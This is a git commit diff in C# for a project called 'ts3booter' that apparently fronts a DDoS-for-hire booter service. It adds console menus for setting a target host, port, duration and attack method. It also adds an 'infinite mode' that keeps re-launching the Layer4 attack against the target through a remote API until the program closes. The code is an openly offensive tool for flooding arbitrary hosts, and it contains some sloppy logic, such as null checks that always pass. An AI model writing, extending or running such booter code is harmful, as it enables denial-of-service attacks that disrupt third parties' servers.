84579d1a130ab45df46f33ce5ef1ab9a257e9239
JPN <jpn@isaidpower.dev>
2022-10-13 20:47:14 +0300

    Fully made layer4 handler

--- ts3booter/Layers/Attacks/Layer4Attack.cs
+++ ts3booter/Layers/Attacks/Layer4Attack.cs
@@ -3,6 +3,7 @@ using System.Collections.Generic;
 using System.Linq;
 using System.Text;
 using System.Threading.Tasks;
+using System.Windows.Forms;
 
 namespace ts3booter.Layers.Attacks
 {
@@ -13,7 +14,6 @@ namespace ts3booter.Layers.Attacks
         public int Port { get; set; }
         public int Time { get; set; }
         public string Method { get; set; }
-        public bool Repeat { get; set; }
         public Layer4Attack(MainAPI.Ts3Booter booter)
         {
             ts3 = booter;
@@ -38,7 +38,65 @@ namespace ts3booter.Layers.Attacks
         }
         public void StartAttack()
         {
+            bool sent_infinite = false;
+            Other.Menus.showTitle();
+            Other.Menus.setTitle("Layer4 Attack (" + Host + ")");
+            Other.Menus.showMessage("Sponsored by MineHost.ro - cheap web and Minecraft hosting", ConsoleColor.Yellow);
+            Console.WriteLine();
+            Other.Menus.showMessage("Attack Host: " + Host);
+            Other.Menus.showMessage("Attack Port: " + Port);
+            Other.Menus.showMessage("Attack Time: " + Time);
+            Other.Menus.showMessage("Attack Method: " + Method);
+            Console.WriteLine();
+            DialogResult result = MessageBox.Show("By enabling infinte mode, the attack will not stop until you close the program", "Enable ∞ mode?", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation);
+            if (result == DialogResult.Yes) {
+                Other.Menus.showMessage("Attempting to start an attack...");
+                while (true)
+                {
+                    if (sent_infinite == false)
+                    {
+                        if (!sent_infinite)
+                        {
+                            if (ts3.StartLayer4(Host, Method, Port, Time) == true)
+                            {
+                                Other.Menus.showMessage("Attack started successfuly!", ConsoleColor.Green);
+                                Other.Menus.showMessage("Infinite mode is enabled.");
+                                sent_infinite = true;
+                            } else
+                            {
+                                Console.WriteLine();
+                                Other.Menus.showMessage("Error while sending attack. Breaking out of loop.", ConsoleColor.Red);
+                                break;
+                            }
+                        }
+                        System.Threading.Thread.Sleep((Time * 1000) + 5000);
+                        if (ts3.StartLayer4(Host, Method, Port, Time) != true || sent_infinite)
+                        {
+                            Other.Menus.showMessage("Error while sending attack. Breaking out of loop.", ConsoleColor.Red);
+                            break;
+                        }
+                    }
 
+                }
+                Other.Menus.showMessage("Press ANY key to return to the main menu");
+                Console.ReadKey();
+            } else
+            {
+                Other.Menus.showMessage("Attempting to start an attack...");
+                if (ts3.StartLayer4(Host, Method, Port, Time) == true)
+                {
+                    Other.Menus.showMessage("Attack sent successfuly!", ConsoleColor.Green);
+                } else
+                {
+                    Console.WriteLine();
+                    Other.Menus.showMessage("Error while sending attack.", ConsoleColor.Red);
+                }
+                System.Threading.Thread.Sleep((Time * 1000) + 5000);
+                Console.WriteLine();
+                Other.Menus.showMessage("Attack completed!");
+                Other.Menus.showMessage("Press ANY key to return to the main menu");
+                Console.ReadKey();
+            }
         }
     }
 }
--- ts3booter/Layers/Layer4.cs
+++ ts3booter/Layers/Layer4.cs
@@ -3,19 +3,57 @@ using System.Collections.Generic;
 using System.Linq;
 using System.Text;
 using System.Threading.Tasks;
+using System.Windows.Forms;
 using Microsoft.VisualBasic;
 
 namespace ts3booter.Layers
 {
     internal class Layer4
     {
-
+        private static string SetMethod(MainAPI.Ts3Booter ts3Booter)
+        {
+            string[] methods = ts3Booter.GetMethods();
+set_method: Other.Menus.showTitle();
+            Other.Menus.setTitle("Layer4 Set Method");
+            int i = 0;
+            foreach (string method in methods)
+            {
+                Other.Menus.createItem(i, method);
+                i++;
+            }
+            Console.WriteLine();
+            int option = Int32.Parse(Other.Menus.showInput("No. of method"));
+            if (option > i)
+            {
+                Other.Menus.showMessage("Invalid method number, press ANY key to try again");
+                Console.ReadKey();
+                goto set_method;
+            } else
+            {
+                DialogResult result = MessageBox.Show("Are you sure you want to use this method? (" + methods[option] + ")", "Confirm Method", MessageBoxButtons.YesNo, MessageBoxIcon.Question);
+                if (result == DialogResult.Yes)
+                {
+                    return methods[option];
+                } else
+                {
+                    goto set_method;
+                }
+            }
+        }
         private static void SetParameters(Layers.Attacks.Layer4Attack attack, MainAPI.Ts3Booter ts)
         {
-            string host, method;
-            int port, time;
+            string host = "";
+            string method = "";
+            int port = 0;
+            int time = 0;
 set_parameters: Other.Menus.showTitle();
             Other.Menus.setTitle("Layer4 Parameters");
+            Other.Menus.showMessage("Current configuration");
+            Other.Menus.showMessage("Host: " + Properties.Settings.Default.l4h);
+            Other.Menus.showMessage("Port: " + Properties.Settings.Default.l4p);
+            Other.Menus.showMessage("Time: " + Properties.Settings.Default.l4t);
+            Other.Menus.showMessage("Method: " + Properties.Settings.Default.l4m);
+            Console.WriteLine();
             Other.Menus.createItem(0, "Host");
             Other.Menus.createItem(1, "Port");
             Other.Menus.createItem(2, "Time");
@@ -27,43 +65,86 @@ set_parameters: Other.Menus.showTitle();
                     Other.Menus.showTitle();
                     Other.Menus.setTitle("Layer4 Host");
                     host = Other.Menus.showInput("Host");
+                    if (host != null || host != "")
+                    {
+                        Properties.Settings.Default.l4h = host;
+                    }
                     goto set_parameters;
                 case ConsoleKey.NumPad0:
                     Other.Menus.showTitle();
                     Other.Menus.setTitle("Layer4 Host");
                     host = Other.Menus.showInput("Host");
+                    if (host != null || host != "")
+                    {
+                        Properties.Settings.Default.l4h = host;
+                    }
                     goto set_parameters;
                 case ConsoleKey.D1:
                     Other.Menus.showTitle();
                     Other.Menus.setTitle("Layer4 Port");
                     port = Int32.Parse(Other.Menus.showInput("Port"));
+                    if (port != 0)
+                    {
+                        Properties.Settings.Default.l4p = port;
+                    }
                     goto set_parameters;
                 case ConsoleKey.NumPad1:
                     Other.Menus.showTitle();
                     Other.Menus.setTitle("Layer4 Port");
                     port = Int32.Parse(Other.Menus.showInput("Port"));
+                    if (port != 0)
+                    {
+                        Properties.Settings.Default.l4p = port;
+                    }
                     goto set_parameters;
                 case ConsoleKey.D2:
                     Other.Menus.showTitle();
                     Other.Menus.setTitle("Layer4 Time");
                     time = Int32.Parse(Other.Menus.showInput("Time"));
+                    if (time != 0)
+                    {
+                        Properties.Settings.Default.l4t = time;
+                    }
                     goto set_parameters;
                 case ConsoleKey.NumPad2:
                     Other.Menus.showTitle();
                     Other.Menus.setTitle("Layer4 Time");
                     time = Int32.Parse(Other.Menus.showInput("Time"));
+                    if (time != 0)
+                    {
+                        Properties.Settings.Default.l4t = time;
+                    }
                     goto set_parameters;
-
+                case ConsoleKey.D3:
+                    method = SetMethod(ts);
+                    if (method != null || method != "")
+                    {
+                        Properties.Settings.Default.l4m = method;
+                    }
+                    goto set_parameters;
+                case ConsoleKey.NumPad3:
+                    method = SetMethod(ts);
+                    if (method != null || method != "")
+                    {
+                        Properties.Settings.Default.l4m = method;
+                    }
+                    goto set_parameters;
+                case ConsoleKey.D4:
+                    break;
+                case ConsoleKey.NumPad4:
+                    break;
+                default:
+                    goto set_parameters;
             }
 
         }
         public static void Start(MainAPI.Ts3Booter booter)
         {
+            Attacks.Layer4Attack layer4 = new Attacks.Layer4Attack(booter);
         layer4mm: Other.Menus.showTitle();
             Other.Menus.setTitle("Layer4 Menu");
             Other.Menus.createItem(0, "Set parameters");
             Other.Menus.createItem(1, "Go back");
-            Attacks.Layer4Attack layer4 = new Attacks.Layer4Attack(booter);
             if (layer4.CheckParameters() == true)
             {
                 Other.Menus.createItem(2, "Start attack");
@@ -72,11 +153,19 @@ set_parameters: Other.Menus.showTitle();
             {
                 case ConsoleKey.D0:
                     SetParameters(layer4, booter);
+                    layer4.Host = Properties.Settings.Default.l4h;
+                    layer4.Port = Properties.Settings.Default.l4p;
+                    layer4.Time = Properties.Settings.Default.l4t;
+                    layer4.Method = Properties.Settings.Default.l4m;
                     goto layer4mm;
                 case ConsoleKey.D1:
                     break;
                 case ConsoleKey.NumPad0:
                     SetParameters(layer4, booter);
+                    layer4.Host = Properties.Settings.Default.l4h;
+                    layer4.Port = Properties.Settings.Default.l4p;
+                    layer4.Time = Properties.Settings.Default.l4t;
+                    layer4.Method = Properties.Settings.Default.l4m;
                     goto layer4mm;
                 case ConsoleKey.NumPad1:
                     break;
@@ -101,10 +190,6 @@ set_parameters: Other.Menus.showTitle();
                 default:
                     goto layer4mm;
             }
-        }
-        public static void GetMethods(MainAPI.Ts3Booter booter)
-        {
-
         }
     }
 }
